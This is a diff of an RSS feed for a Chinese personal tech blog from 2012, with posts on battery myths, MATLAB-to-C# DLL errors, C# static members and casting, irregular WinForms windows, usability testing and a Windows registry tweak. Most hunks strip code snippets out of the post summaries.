+ 电池管理类软件对电池寿命没用？ 充电习惯对电池寿命没有用？ 一块电池都只够安卓撑一天？ 提示电池充满就可以马上拔掉电源 ？ 不管怎么用待机时间都一样？ 手机还有一半电量的时候不必担心？ 新电池前3次需充满12小时？ 涓流充电有用吗？ 手机电池充一夜也没什么危害？ 边充电边使用对电池无伤害？ 突然断电再立刻充上会伤害电池吗？ 充电不饱和会伤害电池吗？ iPhone和iPad的充电器可以混用吗？ 经常把电用光再充对电池好不好？  书籍下载：[移动设备电池使用白皮书](http://115.com/file/ancame68# 移动设备电池白皮书.pdf)</description>
     </item>
     
     <item>
@@ -213,7 +211,8 @@ Robin Vessey 让我产生了共鸣，因为它真的是伪VCS（Version Control 
       
       <guid>https://leizhiyuan.github.io/2012/07/03/unable-to-read-file-data_egcitest%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</guid>
       <description>今天做的是使用matlab进行协整检验，好吧。。听起来似乎很厉害的样子，其实，我也不太清楚协整到底是干嘛呢。不过经管的各位很给力。 想来协整检验matlab是可以做的。所以就去查matlab是不是有这个函数，结果是有的。egcitest，但是具体的参数还是景观的朋友看懂的。
-　早上3点多起床，看matlab的书，然后早上看完了。基本上熟悉了matlab的操作。然后就开始写这个。大致的流程和昨天的那篇文章是一致的。但是matlab生成的dll文件在C#里面调用始终会提示这样一个错误。： MWMCR::EvaluateFunction error &amp;hellip; Error using ==&amp;gt; load Unable to read file Data_EGCITest: No such file or directory. Error in =&amp;gt; test.m 组合了几个关键字进行搜索，发现了这篇文章，翻译过来很简单。
+　早上3点多起床，看matlab的书，然后早上看完了。基本上熟悉了matlab的操作。然后就开始写这个。大致的流程和昨天的那篇文章是一致的。但是matlab生成的dll文件在C#里面调用始终会提示这样一个错误。：
+　组合了几个关键字进行搜索，发现了这篇文章，翻译过来很简单。
 　错误提示说的那个Data_EGCITest是一个名为Data_EGCITest.mat的文件，位于$MATLABROOT/toolbox/econ/econ/Data_EGCITest.mat目录下，$MATLABROOT指的是你matlab的安装路径。在你build 工程的时候，在下图中，记得添加这个文件。 
 　然后build生成的dll文件就可以正常在C#里使用了。
 　中间走了很多弯路。因为我想既然matlab都编译生成了dll，那么dll应该没问题。然后我就把精力放在了C#那边。。结果后来折腾了很长时间，才发现是这边的问题。。坑爹。。
@@ -226,10 +225,10 @@ Robin Vessey 让我产生了共鸣，因为它真的是伪VCS（Version Control 
       <pubDate>Mon, 02 Jul 2012 05:30:02 +0000</pubDate>
       
       <guid>https://leizhiyuan.github.io/2012/07/02/c#%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E4%B8%8E%E9%9D%9E%E9%9D%99%E6%80%81/</guid>
-      <description> 为什么要分静态和非静态 在面向对象的世界里，大部分的情况都是实例特征主宰天下，类相当于一个类型模板，而对象则是类特征的拷贝，并且独立于其他对象来操作这些特征，但是在某些情况下，需要某些特征被所有的对象共公有，因此有必要实现一种基于类的特征，而不是基于实例对象的特征机制，这就是静态特征。
+      <description>为什么要分静态和非静态 在面向对象的世界里，大部分的情况都是实例特征主宰天下，类相当于一个类型模板，而对象则是类特征的拷贝，并且独立于其他对象来操作这些特征，但是在某些情况下，需要某些特征被所有的对象共公有，因此有必要实现一种基于类的特征，而不是基于实例对象的特征机制，这就是静态特征。
 1.静态类和非静态类  一个类如果包含静态成员和静态方法，那么该类就可以定义为静态类，定义方法是在类定义前加上static，比如
-static class MyClass { //define the class } 比较：   静态类只能包含静态成员和静态方法，否则会抛出编译错误，而非静态类既可以包含非静态成员和非静态方法，还可以包含静态成员和静态方法。但不能作用于静态只读字段。 静态类不可实例化，非静态类可以实例化，不管是静态类还是非静态类，对静态成员和静态方法的调用都必须通过类来实现访问。 相对于非静态类来说，静态类有一些特点值得应用，比如System.Console这个典型的静态类。 如果一个类只包含静态成员和静态方法，就应该将该类标记为static，并提供私有的构造函数来避免用户实例创建对象，这也是MonoState模式的体现。    2.静态构造函数和实例构造函数  静态构造函数，只能用于初始化类中的静态成员，包括静态字段和静态属性，静态构造函数不能带参数，不能有访问修饰符也不能被手工调用，通过是在.net运行库第一次调用类成员之前执行。其中，实例构造函数中也是可以初始化静态成员的。
-比较   静态构造函数，可以和无参的构造函数共存。虽然参数列表相同，但是二者的执行顺序不同，静态构造函数在运行库加载类时执行，而实例构造函数在实例创建时执行。 静态构造函数，只能对静态成员进行初始化操作，不能作用于非静态成员，而实例构造函数二者都可以，当然如前面所说，对静态只读字段就不可以了。 静态构造函数只被执行一次，而且.net运行库也不知道什么时候会被执行，而实例构造函数可以在多次实例创建时被执行多次。 一个类只能有一个静态构造函数，但是可以有多个实例构造函数。 一般来说，简单的静态成员可以在声明时就进行初始化，而复杂的静态成员则选择在静态构造函数中进行初始化较佳。    3.静态成员和实例成员  静态成员主要包括静态字段和静态属性，静态成员可以实现在类中能够被所有实例对象共享的数据。例如一个缴费登记系统中，消费总额作为所以消费的综合，静态成员来实现就有很好。没有不必要的数据冗余。
+比较：   静态类只能包含静态成员和静态方法，否则会抛出编译错误，而非静态类既可以包含非静态成员和非静态方法，还可以包含静态成员和静态方法。但不能作用于静态只读字段。 静态类不可实例化，非静态类可以实例化，不管是静态类还是非静态类，对静态成员和静态方法的调用都必须通过类来实现访问。 相对于非静态类来说，静态类有一些特点值得应用，比如System.Console这个典型的静态类。 如果一个类只包含静态成员和静态方法，就应该将该类标记为static，并提供私有的构造函数来避免用户实例创建对象，这也是MonoState模式的体现。      2.静态构造函数和实例构造函数  静态构造函数，只能用于初始化类中的静态成员，包括静态字段和静态属性，静态构造函数不能带参数，不能有访问修饰符也不能被手工调用，通过是在.net运行库第一次调用类成员之前执行。其中，实例构造函数中也是可以初始化静态成员的。
+比较   静态构造函数，可以和无参的构造函数共存。虽然参数列表相同，但是二者的执行顺序不同，静态构造函数在运行库加载类时执行，而实例构造函数在实例创建时执行。 静态构造函数，只能对静态成员进行初始化操作，不能作用于非静态成员，而实例构造函数二者都可以，当然如前面所说，对静态只读字段就不可以了。 静态构造函数只被执行一次，而且.net运行库也不知道什么时候会被执行，而实例构造函数可以在多次实例创建时被执行多次。 一个类只能有一个静态构造函数，但是可以有多个实例构造函数。 一般来说，简单的静态成员可以在声明时就进行初始化，而复杂的静态成员则选择在静态构造函数中进行初始化较佳。      3.静态成员和实例成员  静态成员主要包括静态字段和静态属性，静态成员可以实现在类中能够被所有实例对象共享的数据。例如一个缴费登记系统中，消费总额作为所以消费的综合，静态成员来实现就有很好。没有不必要的数据冗余。
 比较   静态成员包括静态字段和静态属性，静态字段一般实现为private，而静态属性一般为public，以体现类的封装原则。 静态成员和类关联，不依赖对象存在，只能由类访问，而不能由对象访问，实例成员和具体的对象关联，只能由对象访问，不能由类访问。 静态成员属于类所有，不论创建多少个实例对象，静态成员在内存中只有一份，实例成员属于对象实例所有，每个都有其对应的内存区域。    4.静态方法和实例方法  类似于静态成员共享数据段，静态方法共享代码段，静态方法以static标识。
 比较   性能上，静态方法和实例方法差别不大，所有方法，不管是静态的还是非静态的，都是在JIT加载类时分配内存，不同的是静态方法以类名引用，而静态方法以对象引用，创建实例时，不会再为类的方法分配内存，所有的实例对象公用一个类的方法代码，因此，静态方法和实例方法的调用，区别仅在于实例方法需要当前对象指针指向该方法，而静态方法可以直接调用，性能上差异微乎其微。 静态方法只能访问静态成员和静态方法，可以间接通过创建实例对象来访问实例成员和实例方法，而实例方法可以直接全部。。 静态方法只能由类来访问，实例方法只能由对象来访问。 静态方法中不能使用this关键字，否则编译错误，而实例方法中可以引用。 静态方法不能被标记为virtual，abstract或是override，静态方法可以被派生类访问，但是不能被覆写。 Main方法是静态的，因此Main方法不能直接访问Main所在类的实例方法和成员。 鉴于线程处理的安全性，应该避免提供改变静态状态的静态方法，因为，如果多线程同时访问该段代码，可能造成线程处理错误，因此，静态状态必须是线程安全的。 静态方法适合系统中边缘性的非业务需要，例如通用的工具类。    </description>
     </item>
@@ -241,9 +240,9 @@ static class MyClass { //define the class } 比较：   静态类只能包含静
       
       <guid>https://leizhiyuan.github.io/2012/07/01/c%E4%B8%AD%E7%9A%84is%E5%92%8Cas/</guid>
       <description>is和as都是用作类型转换的，类型转换包括显示转换和隐式转换，在.NET中类型转换的基本规则如下：
-基本规则   任何类型都可以安全的转换为其基类类型，可以由隐式转换来完成； 任何类型转换为其派生类型时，必须进行显示转换，转换的规则是：（类型名）对象名； 使用GetType可以取得任何对象的精确类型； 基本类型可以使用Covert类实现类型转换； 除了string以外的其他类型都有Parse方法，用于将字符串类型转换为对应的基本类型； 值类型和引用类型的转换机制称为装箱（boxing）和拆箱（unboxing）。 is和as操作符，是C#中用于类型转换的，提供了对类型兼容性的判断，从而使得类型转换控制在安全的范畴，提供了灵活的类型转换控制。   is的模式如下：   检查对象类型的兼容性，并返回结果，true或者false； 不会抛出异常； 如果对象为null，则返回值永远为false。 使用很简单，用于条件判断中.   举例： object o=new object(); if(o is ISSsample) { //转换 ISSample a =(ISSample)o; } &amp;nbsp;
-as的模式如下：   检查对象类型的兼容性，并返回转换结果，如果不兼容就返回null； 不会抛出异常； 如果结果判断为空，则强制执行类型转换将抛出NullReferenceException异常。 as必须和引用类型一起使用   举例： object o =new object(); ASSample a=o as ASSample; if(a!=null) //do some work &amp;nbsp;
-参考：http://www.cnblogs.com/anytao/archive/2007/04/07/must_net_01.html</description>
+基本规则   任何类型都可以安全的转换为其基类类型，可以由隐式转换来完成； 任何类型转换为其派生类型时，必须进行显示转换，转换的规则是：（类型名）对象名； 使用GetType可以取得任何对象的精确类型； 基本类型可以使用Covert类实现类型转换； 除了string以外的其他类型都有Parse方法，用于将字符串类型转换为对应的基本类型； 值类型和引用类型的转换机制称为装箱（boxing）和拆箱（unboxing）。 is和as操作符，是C#中用于类型转换的，提供了对类型兼容性的判断，从而使得类型转换控制在安全的范畴，提供了灵活的类型转换控制。   is的模式如下：   检查对象类型的兼容性，并返回结果，true或者false； 不会抛出异常； 如果对象为null，则返回值永远为false。 使用很简单，用于条件判断中.   举例：
+ as的模式如下：   检查对象类型的兼容性，并返回转换结果，如果不兼容就返回null； 不会抛出异常； 如果结果判断为空，则强制执行类型转换将抛出NullReferenceException异常。 as必须和引用类型一起使用   举例：
+ 参考：http://www.cnblogs.com/anytao/archive/2007/04/07/must_net_01.html</description>
     </item>
     
     <item>
@@ -258,12 +257,14 @@ as的模式如下：   检查对象类型的兼容性，并返回转换结果，
 
 然后新建windows应用程序。创建windows窗体并设置窗体基本属性。 （1）将 FormBorderStyle 属性设置为 None。 （2）将窗体的 BackgroundImage 属性设置为先前创建的位图文件。不必将文件添加到项目系统中；这将在指定该文件作为背景图像时自动完成。 （3）将 TransparencyKey 属性设置为位图文件的背景色，本例中为蓝色。（此属性告诉应用程序窗体中的哪些部分需要设置为透明。 ） 上面两个步骤已经完成了不规则窗体自身显示效果的制作。
 有人说在24位色以下的环境中可以显示正常，但在24位色以上时黄色背景不能消失，所以上述不能胜任24位色以上环境。但我看到了一种解决方法，那就是先将背景图片添加到资源文件，然后在窗体构造时为窗体设置背景图片：
-&amp;nbsp; private void Form1_Load(object sender, EventArgs e){
-Bitmap bmp = Properties.Resources.form2; bmp.MakeTransparent(Color.Blue); // bmp.MakeTransparent(Color.FromArgb(2,2,2));如果rgb则是这样用 this.BackColor = Color.Blue; this.BackgroundImage = bmp; this.TransparencyKey = Color.Blue;
-} &amp;nbsp;
-实测是可以的。
-然后就是为窗体添加移动、关闭、最大最小化的事件。代码直接给出 private bool isMouseDown = false; //记录鼠标是否被按下 private Point position; //记录鼠标位置
-private void Form1_MouseDown(object sender, MouseEventArgs e) { if (e.Button == MouseButtons.Left) { int x = -e.</description>
+  实测是可以的。
+然后就是为窗体添加移动、关闭、最大最小化的事件。代码直接给出 还有其他一些比如关闭按钮的添加，都很简单，直接添加一个button，事件里写，两个选一个。
+我最终的效果是个圆，可以看到，锯齿很明显，我想要效果好的话，那个位图得好好设计。这个只是演示。。所以。。还有一种方法是链接1中提供的，有兴趣的可以试试。
+
+工程源码下载：IrregularForm.7z
+参考：
+http://www.cnblogs.com/KissKnife/archive/2006/10/02/520116.html
+http://allancandy.cnblogs.com/archive/2005/09/01/227814.html</description>
     </item>
     
     <item>
@@ -305,10 +306,9 @@ private void Form1_MouseDown(object sender, MouseEventArgs e) { if (e.Button == 
 1.Many Usability Aspects Identified in HE are Confirmed in Think-Aloud Usability Tests 许多可用性方面的问题可以在HE中识别。然后在Think Aloud测试中被确认。
 2.When HE Predictions are not Confirmed by Think-Aloud Usability Tests 当HE预测了问题但是Think Aloud中，并没有发现。这种情况下。请相信Think Aloud测试。因为用户是王道。数据比预测更准确。
 3.&amp;ldquo;False Alarms&amp;rdquo; vs. True Problems 假警告vs真问题，这个举个例子，在对话框中，有三个按钮。OK ，Apply和Cancel ，虽然HE规则预测了这个迷惑性。但是进行Think Aloud测试的时候，并没有这个问题，原因是用户就没想过这个事，他只按ok，但这并不能避免问题，或者说似乎这个问题并不是个问题，还有一种情况，比如HE规则中的文档帮助的问题，可能用户在测试的时候就没打开文档。这就需要HE来评估了。所以，这种情况下，还是应该好好分析一下HE给出的评估来改进系统。
-4.Think-Aloud Usability Tests Can Show Things HEs Can&amp;rsquo;t Show Think Aloud测试可以展示HE没有发现的问题。
+4.Think-Aloud Usability Tests Can Show Things HEs Can&#39;t Show Think Aloud测试可以展示HE没有发现的问题。
 HE规则因为是建立在早期草稿原型上的。并不是真实情况，他只是在早期给出设计上的问题，他不能预测真实系统的问题，比如程序运行速度非常慢，以至于用户难以忍受。这就需要Think Aloud才能发现了。
-&amp;nbsp;
-基本上SSD4就讲了这么些东西了。四篇文章四点写到7点。。基本上算是写完了。工科男求安慰。。</description>
+ 基本上SSD4就讲了这么些东西了。四篇文章四点写到7点。。基本上算是写完了。工科男求安慰。。</description>
     </item>
     
     <item>
@@ -419,7 +419,7 @@ The system should speak the users&amp;rsquo; language, with words, phrases and c
 　“MC”，英文 Memory Clear，用于清除存储器中的数值，默认为0
 　“C”， 英文 Cancel，就是全部撤销；
 　“CE”， 英文 Cancel Error，也就是撤销错误输入。
-　现在来说个例子，比如我要计算100*2+11*3因为一些计算器不支持整个式子输入。也是为了演示这些功能。我们可以这样输入，
+　现在来说个例子，比如我要计算1002+113因为一些计算器不支持整个式子输入。也是为了演示这些功能。我们可以这样输入，
 　先输入100，然后 * ，然后 2 ，按下等号，这时候输入栏变成了200，我们按下MS 或者M+，按下MS的话把200存到了存储器，而按下M+呢，因为存储器默认是0，所以就相当于0+200，存储器里就是200了。然后我们继续输入11 ，输入 +，输入3 ，按下等号，输入栏变成了33.我们按下M+，这时候输入栏并没有改变。因为M+将存储器里的200加上了33.则存储器里变成了233.我们按下MR就是读取存储器的值，这样输入栏就可以看到233了。我们就可以继续用233来运算了。MC就是清除233.恢复为0.
 　例如：想要9*6，如果按6按错按成5了， 按C就是从头来过， 这时就要重新按9了， 但是如果你按CE的话， 就只要输入6就行了， 不必输入前面的了。
 　我个人感觉M存储器就相当于一个草稿。吧计算中的一些临时值存储起来，就不用手记了。我记得我那时候有时候算值还得先把一些临时值写在纸上，后面重新输入。没文化真可怕。</description>
@@ -432,7 +432,8 @@ The system should speak the users&amp;rsquo; language, with words, phrases and c
       
       <guid>https://leizhiyuan.github.io/2012/04/28/wordpress-%E5%AE%9E%E7%8E%B0404%E4%B8%AA%E6%80%A7%E8%B7%B3%E8%BD%AC%E9%A1%B5%E9%9D%A2/</guid>
       <description>这个就不多说了，直接贴代码，使用方法就是把这些代码全部拷贝进你的404.php这个文件。后台点击外观-编辑-选择404.php，开始编辑，
-完成后然后就可以自己测试下效果了，你也可以先访问http://leaver.me/test404查看效果 &amp;lt;title&amp;gt;404&amp;lt;/title&amp;gt; &amp;lt;style type=&amp;ldquo;text/css&amp;rdquo;&amp;gt; body{ margin:0; padding:0; font:14px/1.6 Arial,Sans-serif; background:#fff url(img/body.png) repeat-x; } a:link,a:visited{ color:#007ab7; text-decoration:none; } h1{ position:relative; z-index:2; width:540px; height:0; margin:110px auto 15px; padding:230px 0 0; overflow:hidden; xxxxborder:1px solid; background-image: url(http://leaverimage.b0.upaiyun.com/20346_o.jpg); background-repeat: no-repeat; } h2{ position:absolute; top:17px; left:187px; margin:0; font-size:0; text-indent:-999px; -moz-user-select:none; -webkit-user-select:none; user-select:none; cursor:default; width: 534px; } h2 em{ display:block; font:italic bold 200px/120px &amp;ldquo;Times New Roman&amp;rdquo;,Times,Serif; text-indent:0; letter-spacing:-5px; color:rgba(216,226,244,0.3); } .link a{margin-right:1em;} .link,.texts{ width:540px; margin:0 auto 15px; color:#505050; } .</description>
+完成后然后就可以自己测试下效果了，你也可以先访问http://leaver.me/test404查看效果
+  </description>
     </item>
     
     <item>
@@ -445,7 +446,10 @@ The system should speak the users&amp;rsquo; language, with words, phrases and c
 　启动方法：对着我的电脑点右键-》管理-》服务和应用-》服务 找到对应的服务后，右键属性，启动类型就可以了 但是如上操作有时并不可以，会提示有些服务不能启动，这种情况下，
 　用管理员账号登陆，再打开 c:\windows\system32\logfiles 如果看到 wmi文件夹，在wmi文件夹上点右键，点 获取管理员权限 ,后重启即可修复。 
 　附上Win7下添加右键获取管理员权限的方法：
-在Win7下经常要用到管理员权限,为了方便可以添加一个右键菜单,方法如下: 新建一个“记事本”文件，复制以下内容： Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT*\shell\runas] @=&amp;ldquo;获取管理员权限&amp;rdquo; &amp;ldquo;NoWorkingDirectory&amp;rdquo;=&amp;ldquo;&amp;rdquo; [HKEY_CLASSES_ROOT*\shell\runas\command] @=&amp;ldquo;cmd.exe /c takeown /f \&amp;ldquo;%1\&amp;rdquo; &amp;amp;&amp;amp; icacls \&amp;ldquo;%1\&amp;rdquo; /grant administrators:F&amp;rdquo; &amp;ldquo;IsolatedCommand&amp;rdquo;=&amp;ldquo;cmd.</description>
+在Win7下经常要用到管理员权限,为了方便可以添加一个右键菜单,方法如下: 新建一个“记事本”文件，复制以下内容：
+复制好后选文件-另存为,保存类型选&amp;quot;所有文件&amp;rdquo;,文件扩展名为reg 然后运行即可。
+Win7下取消右键获取管理员权限方法：
+同样的保存上面内容为reg格式文件即可。</description>
     </item>
     
     <item>
@@ -494,8 +498,7 @@ The system should speak the users&amp;rsquo; language, with words, phrases and c
       <guid>https://leizhiyuan.github.io/2012/04/16/php%E5%92%8Cmysql%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E7%BB%86%E8%AF%B4php/</guid>
       <description>今天从早上到下午一使劲把PHP和MySQL程序设计 这本书读完了。因为昨天读完了head first的那本php书。所以看这本书难度也不是很大。先对这本书整体评价一下。
 　这本书我其实之前并没有在豆瓣上看看评论。豆瓣也不适合看这类专业书的评论。只是看到是第三版。说明这本书还是不错的。一般国内的专业书很少看到出过第二版的。。因为质量实在是太差了。选好书的一个方法就是看版本。。能出到第N版的都是有其可圈可点之处的。于是把这本书拿来就看。
-　书从头看到尾。我只能说大叔把代码贴的太多了。但是好事情就是代码给出了执行结果。这基本上方便了我直接看代码。文字部分跳过一些。但是，大叔，我也是人啊。 你把代码贴这么多。。函数给这么全。这也记不住啊。而且书也并不是有个循序渐进的过程。对比昨天看的head first的书。深深体会到一本好的入门书是多么重要啊。这本书并不如它的宣传那样适合新手读。很多地方都用了结果还没解释。到后面又开始解释。完全无条理。。最最重要的是错误太多了。。
-　不过。对我还是有很大收获的。因为看了这本书就发现head first的书确实是入门书。讲的比较浅。（但非常重要），一些框架。模板。类在这里面都有讨论。需要花些时间搞清楚。我已经记下来了。稍后准备阅读一下这些主题，
+　书从头看到尾。我只能说大叔把代码贴的太多了。但是好事情就是代码给出了执行结果。这基本上方便了我直接看代码。文字部分跳过一些。但是，大叔，我也是人啊。 你把代码贴这么多。。函数给这么全。这也记不住啊。而且书也并不是有个循序渐进的过程。对比昨天看的head first的书。深深体会到一本好的入门书是多么重要啊。这本书并不如它的宣传那样适合新手读。很多地方都用了结果还没解释。到后面又开始解释。完全无条理。。最最重要的是错误太多了。。　不过。对我还是有很大收获的。因为看了这本书就发现head first的书确实是入门书。讲的比较浅。（但非常重要），一些框架。模板。类在这里面都有讨论。需要花些时间搞清楚。我已经记下来了。稍后准备阅读一下这些主题，
 　中午还用了一个多小时看完了《细说PHP》，不便于多说什么。。和《PHP和MySQL程序设计》的区别就是代码没有执行结果。讲的倒还算清楚。因为我看这本书不仔细。只是捡自己不会的去看。所以对本书评价不是太高。相比前一本书。这本书列的函数没那么多。都是比较实用的。。这点很好。但是看豆瓣和亚马逊到评分倒还挺高的。。令我情何以堪啊。 一会把一点知识点贴上来。记录一下今日的收获吧。。</description>
     </item>
     
